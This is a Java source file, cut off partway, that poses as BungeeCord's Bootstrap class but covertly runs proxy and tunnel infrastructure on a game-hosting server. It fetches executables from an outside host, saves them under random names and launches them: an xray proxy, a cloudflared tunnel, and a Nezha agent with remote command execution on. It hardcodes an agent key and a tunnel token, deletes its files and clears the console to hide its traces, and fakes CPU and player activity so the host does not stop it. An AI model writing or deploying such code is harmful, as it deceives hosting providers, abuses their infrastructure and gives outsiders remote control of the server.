package net.md_5.bungee;

import com.sun.net.httpserver.HttpServer;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.Base64;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.*;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

public class Bootstrap
{
    // ============ ANSI 颜色 ============
    private static final String ANSI_GREEN  = "\033[1;32m";
    private static final String ANSI_RED    = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET  = "\033[0m";

    // ============ 运行状态 ============
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process      minecraftProcess;
    private static Thread       fakePlayerThread;
    private static Thread       cpuKeeperThread;
    private static HttpServer   httpServer;

    // ============ 环境变量键列表（用于 .env 文件解析）============
    private static final String[] ALL_ENV_VARS = {
        "PORT", "SERVER_PORT", "FILE_PATH", "SUB_PATH",
        "UUID", "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY",
        "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "CFIP", "CFPORT", "NAME",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT",
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME"
    };

    // ============ 从环境变量或 .env 文件加载的配置 ============
    private static String FILE_PATH;
    private static String SUB_PATH;
    private static int    PORT;
    private static String UUID;
    private static String NEZHA_SERVER;
    private static String NEZHA_PORT_S;
    private static String NEZHA_KEY;
    private static String ARGO_DOMAIN;
    private static String ARGO_AUTH;
    private static String ARGO_PORT;
    private static String CFIP;
    private static String CFPORT;
    private static String NAME;

    private static final List<String> TLS_PORTS = Arrays.asList("443","8443","2096","2087","2083","2053");

    // ============ 随机文件名（无特征）============
    private static String nameWeb;
    private static String nameBot;
    private static String nameNpm;
    private static String namePhp;

    private static String pWeb;
    private static String pBot;
    private static String pNpm;
    private static String pPhp;
    private static String pSub;
    private static String pBootLog;
    private static String pConfig;
    private static String pTJson;
    private static String pTYml;
    private static String pTYaml;

    private static volatile String subContent = "";

    // ============ 入口 ============
    public static void main(String[] args) throws Exception {
        // 加载配置（环境变量 → .env 文件 → 默认值）
        Map<String, String> cfg = loadConfig();

        FILE_PATH   = cfg.get("FILE_PATH");
        SUB_PATH    = cfg.get("SUB_PATH");
        PORT        = Integer.parseInt(cfg.get("PORT"));
        UUID        = cfg.get("UUID");
        NEZHA_SERVER= cfg.get("NEZHA_SERVER");
        NEZHA_PORT_S= cfg.get("NEZHA_PORT");
        NEZHA_KEY   = cfg.get("NEZHA_KEY");
        ARGO_DOMAIN = cfg.get("ARGO_DOMAIN");
        ARGO_AUTH   = cfg.get("ARGO_AUTH");
        ARGO_PORT   = cfg.get("ARGO_PORT");
        CFIP        = cfg.get("CFIP");
        CFPORT      = cfg.get("CFPORT");
        NAME        = cfg.get("NAME");

        // 初始化随机文件名
        nameWeb = rnd(6); nameBot = rnd(6); nameNpm = rnd(6); namePhp = rnd(6);
        pWeb     = FILE_PATH + "/" + nameWeb;
        pBot     = FILE_PATH + "/" + nameBot;
        pNpm     = FILE_PATH + "/" + nameNpm;
        pPhp     = FILE_PATH + "/" + namePhp;
        pSub     = FILE_PATH + "/sub.txt";
        pBootLog = FILE_PATH + "/boot.log";
        pConfig  = FILE_PATH + "/config.json";
        pTJson   = FILE_PATH + "/tunnel.json";
        pTYml    = FILE_PATH + "/tunnel.yml";
        pTYaml   = FILE_PATH + "/config.yaml";

        new File(FILE_PATH).mkdirs();

        // HTTP 订阅服务
        httpServer = HttpServer.create(new InetSocketAddress(PORT), 0);
        httpServer.createContext("/", exchange -> {
            String path = exchange.getRequestURI().getPath();
            byte[] body = ("/" + SUB_PATH).equals(path)
                ? subContent.getBytes(StandardCharsets.UTF_8)
                : "OK".getBytes(StandardCharsets.UTF_8);
            String ct = ("/" + SUB_PATH).equals(path)
                ? "text/plain; charset=utf-8" : "text/plain";
            exchange.getResponseHeaders().set("Content-Type", ct);
            exchange.sendResponseHeaders(200, body.length);
            try (OutputStream os = exchange.getResponseBody()) { os.write(body); }
        });
        httpServer.start();
        System.out.println(ANSI_GREEN + "Listening on port " + PORT + ANSI_RESET);

        // ★ 先启动 Minecraft 服务器（如果配置了）
        if (isMcServerEnabled(cfg)) {
            startMinecraftServer(cfg);
            System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
            Thread.sleep(30000);
        }

        // 启动 CPU Keeper（防止平台因空闲杀死进程）
        startCpuKeeper();

        // 启动代理服务（xray + cloudflared + nezha）
        new Thread(() -> {
            try {
                startup();
            } catch (Exception e) {
                System.err.println(ANSI_RED + "Startup error: " + e.getMessage() + ANSI_RESET);
                try { Thread.sleep(10000); startup(); } catch (Exception ignored) {}
            }
        }).start();

        // 注册关闭钩子
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            running.set(false);
            stopServices();
        }));

        // 等待服务启动完成后再启动 Fake Player
        Thread.sleep(115000);
        System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);

        if (isFakePlayerEnabled(cfg)) {
            System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
            waitForServerReady(cfg);
            startFakePlayerBot(cfg);
        }

        System.out.println(ANSI_GREEN + "\nThank you for using this script, Enjoy!\n" + ANSI_RESET);
        System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds" + ANSI_RESET);
        Thread.sleep(20000);
        clearConsole();

        // 主线程保持运行
        while (running.get()) {
            try {
                Thread.sleep(60000);
            } catch (InterruptedException e) {
                break;
            }
        }
    }

    // ============ 加载配置：默认值 → .env 文件 → 系统环境变量 ============
    private static Map<String, String> loadConfig() throws IOException {
        Map<String, String> cfg = new LinkedHashMap<>();

        // 默认值
        cfg.put("FILE_PATH",    "./tmp");
        cfg.put("SUB_PATH",     "sb");
        cfg.put("PORT",         "3000");
        cfg.put("UUID",         "250cf8ba-baab-4f63-80fe-01f0b5b698e2");
        cfg.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
        cfg.put("NEZHA_PORT",   "");
        cfg.put("NEZHA_KEY",    "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
        cfg.put("ARGO_DOMAIN",  "gameserver.tieniu.dpdns.org");
        cfg.put("ARGO_AUTH",    "eyJhIjoiY2YxMDY1YTFhZDk1YjIxNzUxNGY3MzRjNzgyYzlkMDkiLCJ0IjoiODI1Y2Q1OWUtYzU2Mi00ODMyLWE2MzYtOTcwNjNkMjgxNDcxIiwicyI6Ik5EQmtNV1V5TVRJdFlqZGhOQzAwWVdFNUxXRTFPRE10T0RKaU1qRmtZMkk1WldJdyJ9");
        cfg.put("ARGO_PORT",    "48001");
        cfg.put("CFIP",         "cdns.doon.eu.org");
        cfg.put("CFPORT",       "443");
        cfg.put("NAME",         "Node");
        cfg.put("MC_JAR",       "server99.jar");
        cfg.put("MC_MEMORY",    "512M");
        cfg.put("MC_ARGS",      "");
        cfg.put("MC_PORT",      "25565");
        cfg.put("FAKE_PLAYER_ENABLED", "true");
        cfg.put("FAKE_PLAYER_NAME",    "Steve");

        // 读取 .env 文件（覆盖默认值）
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2 && Arrays.asList(ALL_ENV_VARS).contains(parts[0].trim())) {
                    cfg.put(parts[0].trim(), parts[1].trim().replaceAll("^['\"]|['\"]$", ""));
                }
            }
        }

        // 系统环境变量最高优先级（覆盖 .env 和默认值）
        for (String key : ALL_ENV_VARS) {
            String val = System.getenv(key);
            if (val != null && !val.trim().isEmpty()) cfg.put(key, val.trim());
        }
        // PORT 兼容 SERVER_PORT
        String serverPort = System.getenv("SERVER_PORT");
        if (serverPort != null && !serverPort.trim().isEmpty() && System.getenv("PORT") == null) {
            cfg.put("PORT", serverPort.trim());
        }

        return cfg;
    }

    // ============ 主流程 ============
    private static void startup() throws Exception {
        setupArgo();
        generateXrayConfig();
        downloadFiles();
        startProcesses();

        String domain = ARGO_DOMAIN;
        if (domain.isEmpty() || ARGO_AUTH.isEmpty()) {
            Thread.sleep(5000);
            domain = extractDomain(0);
        }

        generateSubscription(domain);
        scheduleCleanup();
    }

    // ============ 下载所有文件 ============
    private static void downloadFiles() throws Exception {
        String base     = "https://amd64.sss.hidns.vip";
        boolean hasNezha = !NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty();

        if (hasNezha) {
            if (!NEZHA_PORT_S.isEmpty()) {
                downloadFile(base + "/agent", pNpm);
            } else {
                downloadFile(base + "/v1", pPhp);
            }
        }
        downloadFile(base + "/web", pWeb);
        downloadFile(base + "/bot", pBot);

        for (String f : new String[]{pWeb, pBot, pNpm, pPhp}) {
            File file = new File(f);
            if (file.exists()) file.setExecutable(true);
        }
    }

    private static void downloadFile(String urlStr, String dest) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(60000);
        conn.setInstanceFollowRedirects(true);
        conn.setRequestProperty("User-Agent",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36");
        try (InputStream in = conn.getInputStream();
             FileOutputStream out = new FileOutputStream(dest)) {
            byte[] buf = new byte[8192]; int n;
            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        }
    }

    // ============ 生成 Xray 配置 ============
    private static void generateXrayConfig() throws IOException {
        String json =
            "{\"log\":{\"access\":\"/dev/null\",\"error\":\"/dev/null\",\"loglevel\":\"none\"}," +
            "\"inbounds\":[" +
              "{\"port\":" + ARGO_PORT + ",\"protocol\":\"vless\",\"settings\":{" +
                "\"clients\":[{\"id\":\"" + UUID + "\",\"flow\":\"xtls-rprx-vision\"}]," +
                "\"decryption\":\"none\"," +
                "\"fallbacks\":[{\"dest\":3001},{\"path\":\"/vless-argo\",\"dest\":3002}," +
                "{\"path\":\"/vmess-argo\",\"dest\":3003},{\"path\":\"/trojan-argo\",\"dest\":3004}]}," +
                "\"streamSettings\":{\"network\":\"tcp\"}}," +
              "{\"port\":3001,\"listen\":\"127.0.0.1\",\"protocol\":\"vless\"," +
                "\"settings\":{\"clients\":[{\"id\":\"" + UUID + "\"}],\"decryption\":\"none\"}," +
                "\"streamSettings\":{\"network\":\"tcp\",\"security\":\"none\"}}," +
              "{\"port\":3002,\"listen\":\"127.0.0.1\",\"protocol\":\"vless\"," +
                "\"settings\":{\"clients\":[{\"id\":\"" + UUID + "\",\"level\":0}],\"decryption\":\"none\"}," +
                "\"streamSettings\":{\"network\":\"ws\",\"security\":\"none\",\"wsSettings\":{\"path\":\"/vless-argo\"}}," +
                "\"sniffing\":{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false}}," +
              "{\"port\":3003,\"listen\":\"127.0.0.1\",\"protocol\":\"vmess\"," +
                "\"settings\":{\"clients\":[{\"id\":\"" + UUID + "\",\"alterId\":0}]}," +
                "\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"/vmess-argo\"}}," +
                "\"sniffing\":{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false}}," +
              "{\"port\":3004,\"listen\":\"127.0.0.1\",\"protocol\":\"trojan\"," +
                "\"settings\":{\"clients\":[{\"password\":\"" + UUID + "\"}]}," +
                "\"streamSettings\":{\"network\":\"ws\",\"security\":\"none\",\"wsSettings\":{\"path\":\"/trojan-argo\"}}," +
                "\"sniffing\":{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false}}" +
            "]," +
            "\"dns\":{\"servers\":[\"https+local://8.8.8.8/dns-query\"]}," +
            "\"outbounds\":[{\"protocol\":\"freedom\",\"tag\":\"direct\"},{\"protocol\":\"blackhole\",\"tag\":\"block\"}]}";
        writeFile(pConfig, json);
    }

    // ============ 设置 Argo 隧道 ============
    private static void setupArgo() throws IOException {
        if (ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) return;
        if (ARGO_AUTH.contains("TunnelSecret")) {
            writeFile(pTJson, ARGO_AUTH);
            String[] parts   = ARGO_AUTH.split("\"");
            String tunnelId  = parts.length > 11 ? parts[11] : "tunnel";
            writeFile(pTYml,
                "tunnel: " + tunnelId + "\ncredentials-file: " + pTJson + "\nprotocol: http2\n\ningress:\n" +
                "  - hostname: " + ARGO_DOMAIN + "\n    service: http://localhost:" + ARGO_PORT + "\n" +
                "    originRequest:\n      noTLSVerify: true\n  - service: http_status:404\n");
        }
    }

    // ============ 生成哪吒 v1 配置 ============
    private static void generateNezhaConfig() throws IOException {
        String port = NEZHA_SERVER.contains(":") ? NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(":") + 1) : "";
        boolean tls = TLS_PORTS.contains(port);
        writeFile(pTYaml,
            "client_secret: " + NEZHA_KEY + "\ndebug: false\ndisable_auto_update: true\n" +
            "disable_command_execute: false\ndisable_force_update: true\ndisable_nat: false\n" +
            "disable_send_query: false\ngpu: false\ninsecure_tls: true\nip_report_period: 1800\n" +
            "report_delay: 4\nserver: " + NEZHA_SERVER + "\nskip_connection_count: true\n" +
            "skip_procs_count: true\ntemperature: false\ntls: " + tls + "\nuse_gitee_to_upgrade: false\n" +
            "use_ipv6_country_code: false\nuuid: " + UUID + "\n");
    }

    // ============ 启动进程 ============
    private static void startProcesses() throws Exception {
        boolean hasNezha = !NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty();

        if (hasNezha) {
            if (NEZHA_PORT_S.isEmpty()) {
                generateNezhaConfig();
                sh("nohup " + pPhp + " -c \"" + pTYaml + "\" >/dev/null 2>&1 &");
            } else {
                boolean tls = TLS_PORTS.contains(NEZHA_PORT_S);
                sh("nohup " + pNpm + " -s " + NEZHA_SERVER + ":" + NEZHA_PORT_S +
                   " -p " + NEZHA_KEY + (tls ? " --tls" : "") +
                   " --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &");
            }
            Thread.sleep(1000);
        }

        sh("nohup " + pWeb + " -c " + pConfig + " >/dev/null 2>&1 &");
        Thread.sleep(1000);

        String cfArgs;
        if (ARGO_AUTH.matches("[A-Z0-9a-z=]{120,250}")) {
            cfArgs = "tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token " + ARGO_AUTH;
        } else if (ARGO_AUTH.contains("TunnelSecret")) {
            cfArgs = "tunnel --edge-ip-version auto --config " + pTYml + " run";
        } else {
            cfArgs = "tunnel --edge-ip-version auto --no-autoupdate --protocol http2" +
                     " --logfile " + pBootLog + " --loglevel info --url http://localhost:" + ARGO_PORT;
        }
        sh("nohup " + pBot + " " + cfArgs + " >/dev/null 2>&1 &");
        Thread.sleep(2000);
    }

    // ============ 提取 quick tunnel 域名 ============
    private static String extractDomain(int retries) throws Exception {
        try {
            String content = readFile(pBootLog);
            Matcher m = Pattern.compile("https?://([^ ]*trycloudflare\\.com)").matcher(content);
            if (m.find()) return m.group(1);
        } catch (Exception ignored) {}
        if (retries < 5) { Thread.sleep(3000); return extractDomain(retries + 1); }
        throw new RuntimeException("Could not extract domain");
    }

    // ============ 获取 ISP 信息 ============
    private static String getIspInfo() {
        for (String api : new String[]{"https://ipapi.co/json/", "http://ip-api.com/json/"}) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(api).openConnection();
                conn.setConnectTimeout(5000); conn.setReadTimeout(5000);
                String body = readStream(conn.getInputStream());
                Matcher cc  = Pattern.compile("\"country_code\"\\s*:\\s*\"([^\"]+)\"").matcher(body);
                Matcher org = Pattern.compile("\"org\"\\s*:\\s*\"([^\"]+)\"").matcher(body);
                if (cc.find() && org.find()) return cc.group(1) + "_" + org.group(1);
            } catch (Exception ignored) {}
        }
        return "Unknown";
    }

    // ============ 生成订阅 ============
    private static void generateSubscription(String domain) throws IOException {
        String isp      = getIspInfo();
        String nodeName = !NAME.isEmpty() ? NAME + "-" + isp : isp;

        String vmessJson =
            "{\"v\":\"2\",\"ps\":\"" + nodeName + "\",\"add\":\"" + CFIP + "\"," +
            "\"port\":\"" + CFPORT + "\",\"id\":\"" + UUID + "\",\"aid\":\"0\",\"scy\":\"none\"," +
            "\"net\":\"ws\",\"type\":\"none\",\"host\":\"" + domain + "\"," +
            "\"path\":\"/vmess-argo?ed=2560\",\"tls\":\"tls\",\"sni\":\"" + domain + "\"," +
            "\"alpn\":\"\",\"fp\":\"firefox\"}";

        String vless  = "vless://" + UUID + "@" + CFIP + ":" + CFPORT +
            "?encryption=none&security=tls&sni=" + domain + "&fp=firefox&type=ws&host=" + domain +
            "&path=%2Fvless-argo%3Fed%3D2560#" + nodeName;
        String vmess  = "vmess://" + b64(vmessJson);
        String trojan = "trojan://" + UUID + "@" + CFIP + ":" + CFPORT +
            "?security=tls&sni=" + domain + "&fp=firefox&type=ws&host=" + domain +
            "&path=%2Ftrojan-argo%3Fed%3D2560#" + nodeName;

        String sub     = vless + "\n\n" + vmess + "\n\n" + trojan + "\n";
        String encoded = b64(sub);
        writeFile(pSub, encoded);
        subContent = encoded;

        System.out.println(sub);
        System.out.println(encoded);
    }

    // ============ 清理敏感文件（90秒后）============
    private static void scheduleCleanup() {
        new Thread(() -> {
            try { Thread.sleep(90000); } catch (InterruptedException ignored) {}
            for (String f : new String[]{pBootLog, pConfig, pWeb, pBot, pTJson, pTYml, pTYaml})
                new File(f).delete();
            if (!NEZHA_PORT_S.isEmpty()) new File(pNpm).delete();
            else if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) new File(pPhp).delete();
            System.out.print("\033[H\033[2J");
            System.out.flush();
            System.out.println(ANSI_GREEN + "Running." + ANSI_RESET);
        }).start();
    }

    // ============ CPU Keeper（防止平台因空闲杀死进程）============
    private static void startCpuKeeper() {
        cpuKeeperThread = new Thread(() -> {
            while (running.get()) {
                try {
                    long start = System.currentTimeMillis();
                    while (System.currentTimeMillis() - start < 10) {
                        Math.sqrt(Math.random());
                    }
                    Thread.sleep(1000);
                } catch (InterruptedException e) { break; }
            }
        });
        cpuKeeperThread.setDaemon(true);
        cpuKeeperThread.start();
    }

    // ============ 停止所有服务 ============
    private static void stopServices() {
        if (httpServer != null) httpServer.stop(0);
        if (minecraftProcess != null && minecraftProcess.isAlive()) {
            System.out.println(ANSI_YELLOW + "[MC-Server] Stopping..." + ANSI_RESET);
            minecraftProcess.destroy();
        }
        if (fakePlayerThread != null && fakePlayerThread.isAlive()) fakePlayerThread.interrupt();
        if (cpuKeeperThread  != null && cpuKeeperThread.isAlive())  cpuKeeperThread.interrupt();
    }

    // ============ 清除控制台 ============
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }

    // ================================================================
    // ==================== Minecraft 服务器相关 ====================
    // ================================================================

    private static boolean isMcServerEnabled(Map<String, String> config) {
        String jarName = config.get("MC_JAR");
        return jarName != null && !jarName.trim().isEmpty();
    }

    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jarName  = config.get("MC_JAR");
        String memory   = config.getOrDefault("MC_MEMORY", "512M");
        String extraArgs= config.getOrDefault("MC_ARGS", "");

        int mcPort = 25565;
        try {
            String p = config.get("MC_PORT");
            if (p != null && !p.trim().isEmpty()) mcPort = Integer.parseInt(p.trim());
        } catch (Exception ignored) {}
        config.put("MC_PORT", String.valueOf(mcPort));

        if (!memory.matches("\\d+[MG]")) memory = "512M";

        Path jarPath = Paths.get(jarName);
        if (!Files.exists(jarPath)) {
            System.out.println(ANSI_RED + "[MC-Server] Error: " + jarName + " not found!" + ANSI_RESET);
            return;
        }

        // 自动同意 EULA
        Path eulaPath = Paths.get("eula.txt");
        if (!Files.exists(eulaPath)) {
            Files.write(eulaPath, "eula=true".getBytes());
        } else if (!new String(Files.readAllBytes(eulaPath)).contains("eula=true")) {
            Files.write(eulaPath, "eula=true".getBytes());
        }

        // 写入 server.properties
        Path propPath = Paths.get("server.properties");
        String props  = Files.exists(propPath)
            ? new String(Files.readAllBytes(propPath))
            : "server-port=" + mcPort + "\nonline-mode=false\n";
        props = props.replaceAll("player-idle-timeout=\\d+", "player-idle-timeout=0");
        if (!props.contains("player-idle-timeout=")) props += "player-idle-timeout=0\n";
        props = props.replaceAll("server-port=\\d+", "server-port=" + mcPort);
        if (!props.contains("server-port=")) props += "\nserver-port=" + mcPort + "\n";
        if (props.contains("online-mode=true")) props = props.replace("online-mode=true", "online-mode=false");
        else if (!props.contains("online-mode=")) props += "online-mode=false\n";
        Files.write(propPath, props.getBytes());

        System.out.println(ANSI_GREEN + "\n=== Starting Minecraft Server ===" + ANSI_RESET);

        List<String> cmd = new ArrayList<>();
        cmd.add("java");
        cmd.add("-Xms" + memory);
        cmd.add("-Xmx" + memory);
        if (!extraArgs.trim().isEmpty()) cmd.addAll(Arrays.asList(extraArgs.split("\\s+")));
        cmd.add("-XX:+UseG1GC");
        cmd.add("-XX:+DisableExplicitGC");
        cmd.add("-jar");
        cmd.add(jarName);
        cmd.add("nogui");

        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        minecraftProcess = pb.start();

        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null)
                    System.out.println("[MC-Server] " + line);
            } catch (IOException ignored) {}
        }).start();

        Thread.sleep(3000);
    }

    // ================================================================
    // ==================== Fake Player Bot 相关 ====================
    // ================================================================

    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        String enabled = config.get("FAKE_PLAYER_ENABLED");
        return enabled != null && enabled.equalsIgnoreCase("true");
    }

    private static int getMcPort(Map<String, String> config) {
        try { return Integer.parseInt(config.getOrDefault("MC_PORT", "25565").trim()); }
        catch (Exception e) { return 25565; }
    }

    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
        int mcPort = getMcPort(config);
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status..." + ANSI_RESET);
        for (int i = 0; i < 60; i++) {
            Socket testSocket = null;
            try {
                Thread.sleep(5000);
                testSocket = new Socket();
                testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server ready!" + ANSI_RESET);
                Thread.sleep(10000);
                return;
            } catch (Exception ignored) {
            } finally {
                try { if (testSocket != null) testSocket.close(); } catch (Exception ignored) {}
            }
        }
    }

    private static void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        int mcPort = getMcPort(config);

        fakePlayerThread = new Thread(() -> {
            int failCount = 0;
            while (running.get()) {
                Socket socket = null;
                DataOutputStream out = null;
                DataInputStream in = null;
                try {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting..." + ANSI_RESET);
                    socket = new Socket();
                    socket.setReuseAddress(true);
                    socket.setSoLinger(true, 0);
                    socket.setReceiveBufferSize(1024 * 1024 * 10);
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    socket.setSoTimeout(60000);

                    out = new DataOutputStream(socket.getOutputStream());
                    in  = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

                    // Handshake
                    ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
                    DataOutputStream handshake = new DataOutputStream(handshakeBuf);
                    writeVarInt(handshake, 0x00);
                    writeVarInt(handshake, 774);
                    writeString(handshake, "127.0.0.1");
                    handshake.writeShort(mcPort);
                    writeVarInt(handshake, 2);
                    byte[] handshakeData = handshakeBuf.toByteArray();
                    writeVarInt(out, handshakeData.length);
                    out.write(handshakeData);
                    out.flush();

                    // Login
                    ByteArrayOutputStream loginBuf = new ByteArrayOutputStream();
                    DataOutputStream login = new DataOutputStream(loginBuf);
                    writeVarInt(login, 0x00);
                    writeString(login, playerName);
                    java.util.UUID playerUUID = java.util.UUID.nameUUIDFromBytes(
                        ("OfflinePlayer:" + playerName).getBytes("UTF-8"));
                    login.writeLong(playerUUID.getMostSignificantBits());
                    login.writeLong(playerUUID.getLeastSignificantBits());
                    byte[] loginData = loginBuf.toByteArray();
                    writeVarInt(out, loginData.length);
                    out.write(loginData);
                    out.flush();

                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Handshake & Login sent" + ANSI_RESET);
                    failCount = 0;

                    boolean configPhase        = false;
                    boolean playPhase          = false;
                    boolean compressionEnabled = false;
                    int     compressionThreshold = -1;
                    long    loginTime          = System.currentTimeMillis();
                    long    stayOnlineTime     = 60000 + (long)(Math.random() * 60000);

                    while (running.get() && !socket.isClosed()) {
                        if (System.currentTimeMillis() - loginTime > stayOnlineTime) {
                            System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting cycle (Anti-Idle)..." + ANSI_RESET);
                            break;
                        }
                        try {
                            int packetLength = readVarInt(in);
                            if (packetLength < 0 || packetLength > 100000000) throw new IOException("Bad packet size");

                            byte[] packetData;
                            if (compressionEnabled) {
                                int dataLength       = readVarInt(in);
                                int compressedLength = packetLength - getVarIntSize(dataLength);
                                byte[] compressedData = new byte[compressedLength];
                                in.readFully(compressedData);
                                if (dataLength == 0) {
                                    packetData = compressedData;
                                } else if (dataLength > 8192) {
                                    continue;
                                } else {
                                    try {
                                        Inflater inflater = new Inflater();
                                        inflater.setInput(compressedData);
                                        packetData = new byte[dataLength];
                                        inflater.inflate(packetData);
                                        inflater.end();
                                    } catch (Exception e) { continue; }
                                }
                            } else {
                                packetData = new byte[packetLength];
                                in.readFully(packetData);
                            }

                            ByteArrayInputStream packetStream = new ByteArrayInputStream(packetData);
                            DataInputStream packetIn = new DataInputStream(packetStream);
                            int packetId = readVarInt(packetIn);

                            if (!playPhase) {
                                if (!configPhase) {
                                    if (packetId == 0x03) {
                                        compressionThreshold = readVarInt(packetIn);
                                        compressionEnabled   = compressionThreshold >= 0;
                                        System.out.println(ANSI_YELLOW + "[FakePlayer] Compression: " + compressionThreshold + ANSI_RESET);
                                    } else if (packetId == 0x02) {
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login Success" + ANSI_RESET);
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        writeVarInt(new DataOutputStream(ackBuf), 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        configPhase = true;

                                        ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
                                        DataOutputStream info = new DataOutputStream(clientInfoBuf);
                                        writeVarInt(info, 0x00);
                                        writeString(info, "en_US");
                                        info.writeByte(10);
                                        writeVarInt(info, 0);
                                        info.writeBoolean(true);
                                        info.writeByte(127);
                                        writeVarInt(info, 1);
                                        info.writeBoolean(false);
                                        info.writeBoolean(true);
                                        writeVarInt(info, 0);
                                        sendPacket(out, clientInfoBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                } else {
                                    if (packetId == 0x03) {
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Config Finished" + ANSI_RESET);
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        writeVarInt(new DataOutputStream(ackBuf), 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        playPhase = true;
                                    } else if (packetId == 0x04) {
                                        long id = packetIn.readLong();
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x04);
                                        ack.writeLong(id);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    } else if (packetId == 0x0E) {
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x07);
                                        writeVarInt(bufOut, 0);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            } else {
                                if (packetId >= 0x20 && packetId <= 0x30) {
                                    if (packetIn.available() == 8) {
                                        long keepAliveId = packetIn.readLong();
                                        System.out.println(ANSI_GREEN + "[FakePlayer] Ping" + ANSI_RESET);
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x1B);
                                        bufOut.writeLong(keepAliveId);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            }
                        } catch (java.net.SocketTimeoutException ignored) {
                        } catch (Exception e) {
                            System.out.println(ANSI_RED + "[FakePlayer] Packet error: " + e.getMessage() + ANSI_RESET);
                            break;
                        }
                    }
                } catch (Exception e) {
                    System.out.println(ANSI_RED + "[FakePlayer] Connection error: " + e.getMessage() + ANSI_RESET);
                    failCount++;
                } finally {
                    try { if (out     != null) out.close(); }     catch (Exception ignored) {}
                    try { if (in      != null) in.close(); }      catch (Exception ignored) {}
                    try { if (socket  != null && !socket.isClosed()) socket.close(); } catch (Exception ignored) {}
                }
                try {
                    long waitTime = 10000;
                    if (failCount > 3) {
                        waitTime = Math.min(10000 * (long)Math.pow(2, Math.min(failCount - 3, 5)), 300000);
